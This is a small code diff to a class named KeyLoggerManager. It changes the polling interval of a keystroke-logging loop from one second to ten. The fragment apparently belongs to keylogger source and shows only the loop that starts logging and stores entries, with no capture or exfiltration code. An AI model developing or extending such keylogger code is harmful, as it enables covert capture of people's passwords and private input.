@@ -23,7 +23,7 @@ class KeyLoggerManager:
     def run(self):
         self.service.start_logging()
         while self.service.running:
-            time.sleep(1)
+            time.sleep(10)
             self.add_to_dic()
             self.num_of_enter += 1
             if self.num_of_enter == 3:
